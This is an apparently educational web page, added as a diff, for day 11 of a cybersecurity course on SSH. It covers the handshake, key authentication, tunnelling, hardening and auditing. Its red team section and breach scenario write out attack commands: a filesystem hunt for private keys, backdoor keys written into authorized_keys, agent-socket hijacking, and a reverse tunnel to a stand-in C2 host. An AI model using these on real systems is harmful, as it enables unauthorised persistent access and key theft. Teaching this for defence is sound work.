@@ -1,0 +1,581 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+.w{max-width:680px;padding:1.5rem 0}
+.hero{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:1.25rem 1.5rem;margin-bottom:1.25rem}
+.badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;padding:3px 10px;border-radius:var(--border-radius-md);margin-bottom:.75rem}
+.hero h1{font-size:20px;font-weight:500;color:var(--color-text-primary);margin-bottom:.3rem}
+.hero p{font-size:14px;color:var(--color-text-secondary);line-height:1.6}
+.prog-lbl{font-size:11px;color:var(--color-text-secondary);margin-bottom:4px}
+.prog{height:4px;background:var(--color-border-tertiary);border-radius:2px;margin-bottom:1.25rem}
+.prog-fill{height:100%;width:91%;background:var(--color-text-info);border-radius:2px}
+.toc{display:grid;grid-template-columns:repeat(auto-fit,minmax(148px,1fr));gap:8px;margin-bottom:1.25rem}
+.ti{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.6rem .75rem;cursor:pointer;display:flex;align-items:center;gap:8px}
+.ti:hover{background:var(--color-background-secondary)}
+.ti i{font-size:16px;color:var(--color-text-secondary)}
+.ti span{font-size:12px;color:var(--color-text-secondary);line-height:1.3}
+.sec{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);margin-bottom:1rem;overflow:hidden}
+.sh{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.25rem;cursor:pointer;gap:12px}
+.sh:hover{background:var(--color-background-secondary)}
+.sl{display:flex;align-items:center;gap:10px}
+.si{width:32px;height:32px;border-radius:var(--border-radius-md);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.st{font-size:15px;font-weight:500;color:var(--color-text-primary)}
+.ss{font-size:12px;color:var(--color-text-secondary);margin-top:1px}
+.chev{font-size:16px;color:var(--color-text-secondary);transition:transform .2s}
+.chev.open{transform:rotate(180deg)}
+.sb{padding:0 1.25rem 1.25rem;display:none}
+.sb.open{display:block}
+h3{font-size:14px;font-weight:500;color:var(--color-text-primary);margin:1rem 0 .4rem}
+h3:first-child{margin-top:0}
+p{font-size:14px;color:var(--color-text-secondary);line-height:1.7;margin-bottom:.5rem}
+ul{padding-left:1.2rem;margin-bottom:.5rem}
+li{font-size:14px;color:var(--color-text-secondary);line-height:1.9}
+code{font-family:var(--font-mono);font-size:12px;background:var(--color-background-secondary);padding:1px 5px;border-radius:4px;color:var(--color-text-primary)}
+.cb{font-family:var(--font-mono);font-size:12px;background:var(--color-background-secondary);padding:.75rem 1rem;border-radius:var(--border-radius-md);color:var(--color-text-primary);line-height:1.9;margin:.5rem 0;white-space:pre-wrap;border:0.5px solid var(--color-border-tertiary)}
+.div{height:0.5px;background:var(--color-border-tertiary);margin:.75rem 0}
+.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(0,1fr));gap:8px;margin:.5rem 0}
+.mc{background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:.75rem;border:0.5px solid var(--color-border-tertiary)}
+.mc .lbl{font-size:11px;color:var(--color-text-secondary);margin-bottom:4px}
+.mc .val{font-size:13px;font-weight:500;color:var(--color-text-primary);line-height:1.5}
+.tag{display:inline-block;font-size:11px;padding:2px 8px;border-radius:var(--border-radius-md);margin-right:4px;margin-bottom:4px}
+.tb{background:var(--color-background-info);color:var(--color-text-info)}
+.tr{background:var(--color-background-danger);color:var(--color-text-danger)}
+.tg{background:var(--color-background-success);color:var(--color-text-success)}
+.ta{background:var(--color-background-warning);color:var(--color-text-warning)}
+.task-item{display:flex;align-items:flex-start;gap:10px;padding:.6rem 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.task-item:last-child{border-bottom:none}
+.tnum{width:22px;height:22px;border-radius:50%;background:var(--color-background-info);color:var(--color-text-info);font-size:11px;font-weight:500;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}
+.ttxt{font-size:13px;color:var(--color-text-secondary);line-height:1.6}
+.lab-item{display:flex;align-items:flex-start;gap:10px;padding:.5rem 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.lab-item:last-child{border-bottom:none}
+.li-ic{width:28px;height:28px;border-radius:var(--border-radius-md);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ln{font-size:13px;font-weight:500;color:var(--color-text-primary)}
+.ld{font-size:12px;color:var(--color-text-secondary);margin-top:2px}
+.yt{display:flex;align-items:center;gap:10px;background:var(--color-background-danger);border-radius:var(--border-radius-md);padding:.75rem 1rem;margin-top:.5rem;cursor:pointer;border:0.5px solid var(--color-border-tertiary)}
+.yt i{font-size:20px;color:var(--color-text-danger)}
+.yt .yt-t{font-size:13px;font-weight:500;color:var(--color-text-danger)}
+.yt .yt-c{font-size:11px;color:var(--color-text-danger);opacity:.8}
+.tip-item{display:flex;align-items:flex-start;gap:8px;margin-bottom:.6rem}
+.tip-item i{font-size:16px;flex-shrink:0;margin-top:2px}
+.tip-item p{margin:0}
+.post-box{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.75rem 1rem;font-size:13px;color:var(--color-text-secondary);line-height:1.7;margin:.5rem 0}
+.story-block{border-left:2px solid var(--color-border-tertiary);padding-left:1rem;margin:.5rem 0;border-radius:0}
+.sp{font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+.cmd-row{display:flex;align-items:flex-start;gap:10px;padding:.4rem 0;border-bottom:0.5px solid var(--color-border-tertiary)}
+.cmd-row:last-child{border-bottom:none}
+.cmd{font-family:var(--font-mono);font-size:12px;font-weight:500;color:var(--color-text-primary);min-width:185px;flex-shrink:0}
+.cmd-desc{font-size:12px;color:var(--color-text-secondary);line-height:1.5}
+.flow-step{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.6rem .9rem;margin:.3rem 0;display:flex;align-items:flex-start;gap:10px}
+.flow-num{width:20px;height:20px;border-radius:50%;background:var(--color-background-info);color:var(--color-text-info);font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.flow-text{font-size:13px;color:var(--color-text-secondary);line-height:1.5}
+.tunnel-card{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.75rem 1rem;margin:.4rem 0}
+.tunnel-title{font-size:13px;font-weight:500;color:var(--color-text-primary);margin-bottom:.3rem}
+.tunnel-desc{font-size:12px;color:var(--color-text-secondary);line-height:1.6}
+</style>
+
+<div class="w">
+  <div class="hero">
+    <div class="badge" style="background:var(--color-background-danger);color:var(--color-text-danger)"><i class="ti ti-calendar" aria-hidden="true"></i> Month 1 · Week 2 · Day 11</div>
+    <h1>SSH + Remote Access</h1>
+    <p>Today you master SSH — how it works cryptographically, key-based authentication, server hardening, tunnelling for pivoting, and how attackers abuse remote access to move through networks silently.</p>
+  </div>
+  <div class="prog-lbl">Roadmap progress — Day 11 of ~90</div>
+  <div class="prog"><div class="prog-fill"></div></div>
+
+  <div class="toc">
+    <div class="ti" onclick="tog('theory')"><i class="ti ti-book-2" aria-hidden="true"></i><span>Theory</span></div>
+    <div class="ti" onclick="tog('practical')"><i class="ti ti-terminal-2" aria-hidden="true"></i><span>Practical</span></div>
+    <div class="ti" onclick="tog('scenario')"><i class="ti ti-shield-exclamation" aria-hidden="true"></i><span>Scenario</span></div>
+    <div class="ti" onclick="tog('redteam')"><i class="ti ti-sword" aria-hidden="true"></i><span>Red Team</span></div>
+    <div class="ti" onclick="tog('blueteam')"><i class="ti ti-shield-check" aria-hidden="true"></i><span>Blue Team</span></div>
+    <div class="ti" onclick="tog('labs')"><i class="ti ti-flask" aria-hidden="true"></i><span>Free Labs</span></div>
+    <div class="ti" onclick="tog('tasks')"><i class="ti ti-checklist" aria-hidden="true"></i><span>Tasks</span></div>
+    <div class="ti" onclick="tog('book')"><i class="ti ti-books" aria-hidden="true"></i><span>Book of Day</span></div>
+    <div class="ti" onclick="tog('content')"><i class="ti ti-brand-linkedin" aria-hidden="true"></i><span>Content Guide</span></div>
+    <div class="ti" onclick="tog('tips')"><i class="ti ti-bulb" aria-hidden="true"></i><span>Pro Tips</span></div>
+    <div class="ti" onclick="tog('recap')"><i class="ti ti-moon" aria-hidden="true"></i><span>Recap</span></div>
+  </div>
+
+  <!-- 1. THEORY -->
+  <div class="sec">
+    <div class="sh" onclick="tog('theory')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-book-2" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">1. Theory Section</div><div class="ss">SSH handshake · key auth · tunnelling · sshd_config</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-theory" aria-hidden="true"></i>
+    </div>
+    <div class="sb open" id="body-theory">
+
+      <h3>What SSH is and why it replaced Telnet</h3>
+      <p>SSH (Secure Shell) is a cryptographic protocol for operating services securely over an untrusted network. Before SSH, Telnet and rlogin sent everything — including passwords — in plaintext. Any network observer could capture credentials instantly. SSH encrypts the entire session, authenticates both parties, and provides a secure channel for shell access, file transfer, and port forwarding.</p>
+
+      <h3>The SSH connection handshake</h3>
+      <div class="flow-step"><div class="flow-num">1</div><div class="flow-text"><strong>TCP connection:</strong> Client connects to server port 22. A standard TCP three-way handshake occurs first — SSH rides on top of TCP.</div></div>
+      <div class="flow-step"><div class="flow-num">2</div><div class="flow-text"><strong>Version + algorithm negotiation:</strong> Client and server exchange supported SSH versions and algorithm lists — ciphers, MACs, key exchange methods.</div></div>
+      <div class="flow-step"><div class="flow-num">3</div><div class="flow-text"><strong>Key exchange (Diffie-Hellman):</strong> Both sides generate a shared session key without ever transmitting it. This is the mathematical core — an eavesdropper on the network cannot derive the session key even if they capture every packet.</div></div>
+      <div class="flow-step"><div class="flow-num">4</div><div class="flow-text"><strong>Server authentication:</strong> Server presents its host key. Client checks it against <code>~/.ssh/known_hosts</code>. If the key is new, SSH asks you to confirm — TOFU (Trust On First Use). If a previously seen key changes, SSH warns loudly. A changed host key can indicate a MITM attack.</div></div>
+      <div class="flow-step"><div class="flow-num">5</div><div class="flow-text"><strong>User authentication:</strong> Password or key-based. With key auth: the server challenges with data encrypted to the user's public key. The client decrypts it using the private key and returns proof — the private key never leaves the client machine.</div></div>
+      <div class="flow-step"><div class="flow-num">6</div><div class="flow-text"><strong>Encrypted session:</strong> All further communication — commands, output, file transfers, port forwards — travels inside the encrypted tunnel.</div></div>
+
+      <h3>Password auth vs key-based auth</h3>
+      <div class="g2">
+        <div class="mc"><div class="lbl">Password auth</div><div class="val">Simple but weak. Vulnerable to brute-force, credential stuffing, phishing. The password is transmitted (encrypted) to the server. Should be disabled on any production server.</div></div>
+        <div class="mc"><div class="lbl">Key-based auth</div><div class="val">Private key never leaves your machine. Server stores only the public key. Immune to brute-force. The gold standard. Always protect the private key with a passphrase.</div></div>
+      </div>
+
+      <h3>SSH key types — which to use</h3>
+      <div style="margin:.5rem 0">
+        <div class="cmd-row"><div class="cmd">Ed25519</div><div class="cmd-desc">Modern, fastest, most secure. Recommended for all new keys — small size, strong security, widely supported.</div></div>
+        <div class="cmd-row"><div class="cmd">RSA 4096-bit</div><div class="cmd-desc">Classic, universally compatible. Use 4096-bit minimum. 2048-bit is now considered marginal.</div></div>
+        <div class="cmd-row"><div class="cmd">ECDSA</div><div class="cmd-desc">Elliptic curve — good but Ed25519 is preferred on all modern systems.</div></div>
+        <div class="cmd-row"><div class="cmd">DSA</div><div class="cmd-desc">Deprecated. Never use. Insecure under certain RNG conditions.</div></div>
+      </div>
+
+      <h3>SSH tunnelling — three types every security professional needs</h3>
+      <div class="tunnel-card">
+        <div class="tunnel-title">Local port forwarding (-L) — access internal services from outside</div>
+        <div class="tunnel-desc"><code>ssh -L 8080:target-host:80 user@jumphost</code> — traffic to your <code>localhost:8080</code> travels encrypted through jumphost, then to target-host:80. Used to reach internal services through a bastion host.</div>
+      </div>
+      <div class="tunnel-card" style="margin-top:6px">
+        <div class="tunnel-title">Remote port forwarding (-R) — expose your local service on the remote server</div>
+        <div class="tunnel-desc"><code>ssh -R 9090:localhost:3000 user@remoteserver</code> — traffic hitting <code>remoteserver:9090</code> comes back to your <code>localhost:3000</code>. Used in pentesting to create reverse tunnels out from a compromised host — attacker reaches the target even after the initial session ends.</div>
+      </div>
+      <div class="tunnel-card" style="margin-top:6px">
+        <div class="tunnel-title">Dynamic SOCKS proxy (-D) — route all traffic through a pivot point</div>
+        <div class="tunnel-desc"><code>ssh -D 1080 user@jumphost -N</code> — creates a SOCKS5 proxy. All traffic routed through it exits from jumphost's network. Configure <code>proxychains</code> to route any tool's traffic through the tunnel. The most powerful pivoting technique for internal network access.</div>
+      </div>
+
+      <h3>Critical sshd_config settings</h3>
+      <div style="margin:.5rem 0">
+        <div class="cmd-row"><div class="cmd">PermitRootLogin no</div><div class="cmd-desc">Never allow direct root SSH. Use a regular account + sudo. Attackers always try root first.</div></div>
+        <div class="cmd-row"><div class="cmd">PasswordAuthentication no</div><div class="cmd-desc">Single most impactful hardening change. Disable passwords, force keys only.</div></div>
+        <div class="cmd-row"><div class="cmd">PubkeyAuthentication yes</div><div class="cmd-desc">Confirm key auth works before disabling passwords or you lock yourself out.</div></div>
+        <div class="cmd-row"><div class="cmd">AllowUsers alice bob</div><div class="cmd-desc">Whitelist only permitted users. Even a compromised account can't SSH in if not listed.</div></div>
+        <div class="cmd-row"><div class="cmd">MaxAuthTries 3</div><div class="cmd-desc">Limit attempts per connection — slows brute-force significantly.</div></div>
+        <div class="cmd-row"><div class="cmd">LoginGraceTime 30</div><div class="cmd-desc">Default 120s — lower to 30 to reduce auth window.</div></div>
+        <div class="cmd-row"><div class="cmd">X11Forwarding no</div><div class="cmd-desc">Disable unless needed — reduces attack surface.</div></div>
+        <div class="cmd-row"><div class="cmd">AllowTcpForwarding no</div><div class="cmd-desc">Disable tunnelling if your use case doesn't require it.</div></div>
+      </div>
+
+      <div class="div"></div>
+      <div class="yt" onclick="openLink('https://www.youtube.com/watch?v=v45p_kJV98k')">
+        <i class="ti ti-brand-youtube" aria-hidden="true"></i>
+        <div><div class="yt-t">SSH Explained — how it works + key authentication</div><div class="yt-c">NetworkChuck · Visual explanation of the SSH handshake and key auth flow</div></div>
+        <i class="ti ti-external-link" style="margin-left:auto;font-size:14px;color:var(--color-text-danger)" aria-hidden="true"></i>
+      </div>
+      <div class="yt" onclick="openLink('https://www.youtube.com/watch?v=YS5Zh7KExvE')">
+        <i class="ti ti-brand-youtube" aria-hidden="true"></i>
+        <div><div class="yt-t">SSH tunneling explained — local, remote, dynamic</div><div class="yt-c">HackerSploit · All three tunnel types with real security use cases</div></div>
+        <i class="ti ti-external-link" style="margin-left:auto;font-size:14px;color:var(--color-text-danger)" aria-hidden="true"></i>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2. PRACTICAL -->
+  <div class="sec">
+    <div class="sh" onclick="tog('practical')">
+      <div class="sl"><div class="si" style="background:var(--color-background-success)"><i class="ti ti-terminal-2" style="color:var(--color-text-success)" aria-hidden="true"></i></div><div><div class="st">2. Practical Section</div><div class="ss">keygen · deploy · config · harden · scp · audit</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-practical" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-practical">
+
+      <h3>Exercise 1 — generate SSH key pairs</h3>
+      <div class="cb">ssh-keygen -t ed25519 -C "your@email.com"
+# generates ~/.ssh/id_ed25519 (private) and ~/.ssh/id_ed25519.pub (public)
+# ALWAYS set a passphrase when prompted — protect the private key
+
+ssh-keygen -t rsa -b 4096 -C "rsa-fallback"
+# RSA 4096-bit as universal fallback for older systems
+
+ls -la ~/.ssh/
+# id_ed25519 must be 600, .pub files 644, .ssh dir 700
+# Wrong permissions → SSH refuses to use the key
+
+cat ~/.ssh/id_ed25519.pub       # view your public key — safe to share
+# NEVER share the file WITHOUT .pub extension</div>
+
+      <h3>Exercise 2 — deploy keys to a server</h3>
+      <div class="cb">ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server
+# copies public key to remote ~/.ssh/authorized_keys automatically
+
+# Manual method when ssh-copy-id unavailable:
+cat ~/.ssh/id_ed25519.pub | ssh user@server \
+  "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+
+# Connect using specific key:
+ssh -i ~/.ssh/id_ed25519 user@server
+
+# Debug authentication issues:
+ssh -v user@server              # verbose — shows each auth step
+ssh -vvv user@server            # maximum verbosity</div>
+
+      <h3>Exercise 3 — SSH client config file</h3>
+      <div class="cb">cat > ~/.ssh/config << 'EOF'
+Host *
+    ServerAliveInterval 60
+    ServerAliveCountMax 3
+    AddKeysToAgent yes
+
+Host myserver
+    HostName 192.168.1.100
+    User alice
+    Port 22
+    IdentityFile ~/.ssh/id_ed25519
+
+Host internal-db
+    HostName 10.0.0.50
+    User dbadmin
+    ProxyJump myserver          # jump through myserver to reach internal-db
+EOF
+chmod 600 ~/.ssh/config
+
+ssh myserver                    # connect with shorthand alias
+ssh internal-db                 # auto-jumps through myserver</div>
+
+      <h3>Exercise 4 — audit and harden sshd_config</h3>
+      <div class="cb">cat /etc/ssh/sshd_config                          # view full config
+grep -v "^#" /etc/ssh/sshd_config | grep -v "^$"  # active settings only
+sudo sshd -T | grep -E "permitroot|passwordauth|pubkeyauth|maxauthtries"
+# dump all effective compiled settings — includes implicit defaults
+
+# Apply hardening (on a test VM — backup first):
+sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
+sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+sudo sed -i 's/#MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config
+sudo sed -i 's/#LoginGraceTime.*/LoginGraceTime 30/' /etc/ssh/sshd_config
+sudo sshd -t                    # ALWAYS test syntax before reloading
+sudo systemctl reload sshd</div>
+
+      <h3>Exercise 5 — SCP and SFTP for secure file transfer</h3>
+      <div class="cb">scp file.txt user@server:/tmp/               # upload local → remote
+scp user@server:/etc/hostname ./            # download remote → local
+scp -r ~/security-lab/ user@server:/tmp/   # recursive directory upload
+scp -i ~/.ssh/id_ed25519 file.txt user@server:/tmp/  # explicit key
+
+sftp user@server                 # interactive SFTP session
+# sftp commands: ls, cd, get, put, mget, mput, pwd, bye</div>
+
+      <h3>Exercise 6 — authorised keys audit</h3>
+      <div class="cb">cat ~/.ssh/authorized_keys 2>/dev/null          # who can log in as you?
+sudo cat /root/.ssh/authorized_keys 2>/dev/null # who can log in as root?
+
+for user in $(cut -d: -f1 /etc/passwd); do
+  home=$(getent passwd $user | cut -d: -f6)
+  ak="$home/.ssh/authorized_keys"
+  if [[ -f "$ak" ]]; then
+    echo "=== $user ==="
+    cat "$ak"
+  fi
+done
+# lists every authorized key on the system — run this during any incident</div>
+
+      <h3>Exercise 7 — SSH tunnelling practice</h3>
+      <div class="cb"># Local forward — access remote port 8080 locally on port 9000:
+ssh -L 9000:localhost:8080 user@server -N &
+curl http://localhost:9000      # traffic goes encrypted through server
+
+# Dynamic SOCKS proxy on port 1080:
+ssh -D 1080 user@server -N &
+curl --proxy socks5://localhost:1080 https://example.com
+
+# Kill background tunnel:
+kill %1                         # kill most recent background job</div>
+    </div>
+  </div>
+
+  <!-- 3. SCENARIO -->
+  <div class="sec">
+    <div class="sh" onclick="tog('scenario')">
+      <div class="sl"><div class="si" style="background:var(--color-background-warning)"><i class="ti ti-shield-exclamation" style="color:var(--color-text-warning)" aria-hidden="true"></i></div><div><div class="st">3. Real-World Scenario</div><div class="ss">Stolen SSH key pivots through 6 corporate servers</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-scenario" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-scenario">
+      <p>A developer's laptop is compromised via a phishing email. The attacker finds <code>~/.ssh/id_rsa</code> with no passphrase. The key authorises access to the corporate bastion host.</p>
+      <div class="div"></div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Step 1 — key discovery and initial access</div>
+        <p>The attacker reads <code>~/.ssh/config</code> — it reveals the bastion hostname and username. They copy the private key and connect immediately. No brute-force, no vulnerability — just a stolen key that works instantly.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Step 2 — lateral movement via key reuse</div>
+        <p>From the bastion they check <code>~/.ssh/known_hosts</code> — it lists 6 internal servers. The same private key is in <code>authorized_keys</code> on every one of them because the developer reused it everywhere. They SSH to all six silently.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Step 3 — persistent reverse tunnel</div>
+        <p>On the internal database server they run: <code>ssh -R 2222:localhost:22 attacker@c2-server -N -f</code>. This creates a reverse tunnel — the attacker can now SSH back into the internal network through port 2222 on their C2 server at any time, even after the laptop access is revoked.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-danger)">Step 4 — backdoor key injection</div>
+        <p>On each compromised server they append their own public key to <code>~/.ssh/authorized_keys</code>. Even after the stolen developer key is rotated, the attacker's key remains — persistent access survives the incident response.</p>
+      </div>
+      <div class="story-block">
+        <div class="sp" style="color:var(--color-text-success)">Defender lessons</div>
+        <p>Always use passphrases on private keys. Never reuse keys across servers. Audit <code>authorized_keys</code> on all servers immediately when a breach is suspected. Monitor <code>authorized_keys</code> with auditd for any writes. Rotate all keys on any compromised machine.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4. RED TEAM -->
+  <div class="sec">
+    <div class="sh" onclick="tog('redteam')">
+      <div class="sl"><div class="si" style="background:var(--color-background-danger)"><i class="ti ti-sword" style="color:var(--color-text-danger)" aria-hidden="true"></i></div><div><div class="st">4. Red Team Perspective</div><div class="ss">SSH key hunting · pivoting · authorized_keys persistence</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-redteam" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-redteam">
+      <h3>SSH key hunting after foothold</h3>
+      <div class="cb">find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
+find / -name "*.pem" -o -name "*.key" 2>/dev/null | grep -v "/etc/ssl"
+find /home /root -name "known_hosts" 2>/dev/null      # reveals other hosts
+find /home /root -name "config" -path "*/.ssh/*" 2>/dev/null  # SSH client configs
+cat ~/.bash_history | grep -E "ssh |scp |sftp "       # recent SSH usage</div>
+
+      <h3>known_hosts as a network map</h3>
+      <p>The <code>known_hosts</code> file is a complete inventory of every server this user has connected to. Each entry is a target for lateral movement.</p>
+      <div class="cb">cat ~/.ssh/known_hosts                 # all known servers
+cat /root/.ssh/known_hosts             # root's connections (more sensitive)
+grep -h "" /home/*/.ssh/known_hosts 2>/dev/null | cut -d' ' -f1 | sort -u
+# all unique hostnames and IPs across all users</div>
+
+      <h3>Persistence via authorized_keys injection</h3>
+      <div class="cb">ssh-keygen -t ed25519 -f /tmp/attacker_key -N ""
+cat /tmp/attacker_key.pub
+
+echo "ssh-ed25519 AAAA...attacker_key" >> ~/.ssh/authorized_keys
+echo "ssh-ed25519 AAAA...attacker_key" >> /root/.ssh/authorized_keys
+
+ssh -i /tmp/attacker_key user@target   # silent future access</div>
+
+      <h3>Reverse SSH tunnel for persistent C2 access</h3>
+      <div class="cb">ssh -R 2222:localhost:22 attacker@c2.example.com -N -f
+# -f background, -N no command — invisible on process list
+# From attacker C2:
+ssh -p 2222 user@localhost             # connects back to compromised host</div>
+
+      <h3>Credential extraction from SSH agent</h3>
+      <div class="cb">echo $SSH_AUTH_SOCK                    # is an agent running?
+ssh-add -l                             # list loaded keys in agent
+# If agent forwarding is enabled on the jump host,
+# the agent socket from the original user is accessible
+SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.PID ssh-add -l</div>
+    </div>
+  </div>
+
+  <!-- 5. BLUE TEAM -->
+  <div class="sec">
+    <div class="sh" onclick="tog('blueteam')">
+      <div class="sl"><div class="si" style="background:var(--color-background-success)"><i class="ti ti-shield-check" style="color:var(--color-text-success)" aria-hidden="true"></i></div><div><div class="st">5. Blue Team Perspective</div><div class="ss">Harden SSH · audit keys · fail2ban · monitor logins</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-blueteam" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-blueteam">
+      <h3>Complete SSH hardening checklist</h3>
+      <div class="cb">sudo sshd -T | grep -E "^permitrootlogin|^passwordauthentication|^pubkeyauthentication|^maxauthtries|^logingracetime|^allowusers"
+# view all effective SSH settings — verify every production server</div>
+      <ul>
+        <li><code>PermitRootLogin no</code> — never direct root login</li>
+        <li><code>PasswordAuthentication no</code> — keys only on any production system</li>
+        <li><code>MaxAuthTries 3</code> — limit attempts per connection</li>
+        <li><code>LoginGraceTime 30</code> — reduce auth window from 120s</li>
+        <li><code>AllowUsers alice bob</code> — explicit whitelist of permitted accounts</li>
+        <li><code>X11Forwarding no</code> — disable unless explicitly needed</li>
+        <li><code>AllowTcpForwarding no</code> — disable tunnelling if not required</li>
+      </ul>
+
+      <h3>Install and configure fail2ban for SSH</h3>
+      <div class="cb">sudo apt install fail2ban -y
+sudo tee /etc/fail2ban/jail.local << 'EOF'
+[sshd]
+enabled = true
+maxretry = 5
+findtime = 600
+bantime = 3600
+EOF
+sudo systemctl enable --now fail2ban
+sudo fail2ban-client status sshd       # current bans
+sudo fail2ban-client set sshd unbanip [IP]  # manually unban an IP</div>
+
+      <h3>Monitor SSH activity in real time</h3>
+      <div class="cb">tail -f /var/log/auth.log | grep --line-buffered sshd
+grep "Accepted publickey" /var/log/auth.log    # successful key logins
+grep "Accepted password" /var/log/auth.log     # password logins (red flag if disabled)
+grep "Invalid user" /var/log/auth.log | awk '{print $8}' | sort | uniq -c | sort -rn
+# top usernames targeted by brute-force — reveals attacker wordlist</div>
+
+      <h3>Audit authorized_keys and monitor for changes</h3>
+      <div class="cb">auditctl -w /root/.ssh/authorized_keys -p wa -k root_key_changes
+auditctl -w /home/ -p wa -k user_key_changes
+ausearch -k root_key_changes           # any writes to root's authorized_keys?
+
+find /home /root -name "authorized_keys" -newer /etc/passwd 2>/dev/null
+# authorized_keys modified more recently than /etc/passwd — investigate</div>
+
+      <h3>Add SSH audit to recon.sh</h3>
+      <div class="cb">banner "SSH AUDIT"
+echo "--- sshd key settings ---"
+sudo sshd -T 2>/dev/null | grep -E "^permitroot|^passwordauth|^maxauthtries"
+
+echo "--- all authorized_keys files ---"
+find /home /root -name "authorized_keys" 2>/dev/null | while read f; do
+  echo "[$f]"; cat "$f"
+done
+
+echo "--- recent successful SSH logins ---"
+grep "Accepted" /var/log/auth.log 2>/dev/null | tail -10</div>
+    </div>
+  </div>
+
+  <!-- 6. LABS -->
+  <div class="sec">
+    <div class="sh" onclick="tog('labs')">
+      <div class="sl"><div class="si" style="background:var(--color-background-info)"><i class="ti ti-flask" style="color:var(--color-text-info)" aria-hidden="true"></i></div><div><div class="st">6. Free Labs</div><div class="ss">TryHackMe · OverTheWire · HackTheBox</div></div></div>
+      <i class="ti ti-chevron-down chev" id="chev-labs" aria-hidden="true"></i>
+    </div>
+    <div class="sb" id="body-labs">
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-success)"><i class="ti ti-arrow-right" style="color:var(--color-text-success);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">TryHackMe — "SSH" room (Free)</div><div class="ld">Dedicated room on SSH concepts, key-based auth, and configuration. Direct match for today. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://tryhackme.com/room/sshremote')">tryhackme.com/room/sshremote ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-danger)"><i class="ti ti-arrow-right" style="color:var(--color-text-danger);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">OverTheWire — Bandit Levels 13–17 (Free)</div><div class="ld">These levels specifically require SSH key login, port forwarding, and pivoting — exactly today's skills in a puzzle format. Some of the most satisfying Bandit levels. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://overthewire.org/wargames/bandit/')">overthewire.org/wargames/bandit ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-warning)"><i class="ti ti-arrow-right" style="color:var(--color-text-warning);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">TryHackMe — "Lateral Movement and Pivoting" (Free)</div><div class="ld">Covers SSH tunnelling, port forwarding, and pivoting through networks in a real engagement context. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://tryhackme.com/room/lateralmovementandpivoting')">tryhackme.com/room/lateralmovementandpivoting ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-success)"><i class="ti ti-arrow-right" style="color:var(--color-text-success);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">HackTheBox — Starting Point "Meow" (Free tier)</div><div class="ld">First beginner HTB machine involving remote access enumeration — good first real machine to try after today. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://app.hackthebox.com/starting-point')">app.hackthebox.com/starting-point ↗</span></div></div>
+      </div>
+      <div class="lab-item">
+        <div class="li-ic" style="background:var(--color-background-info)"><i class="ti ti-arrow-right" style="color:var(--color-text-info);font-size:14px" aria-hidden="true"></i></div>
+        <div><div class="ln">SSH Audit — online scanner (Free)</div><div class="ld">Scan your SSH server for weak algorithms and misconfigurations. Run it against your own system to see what a security scanner reports. <span style="color:var(--color-text-info);cursor:pointer" onclick="openLink('https://www.ssh-audit.com')">ssh-audit.com ↗</span></div></div>
+      </div>
+    </div>
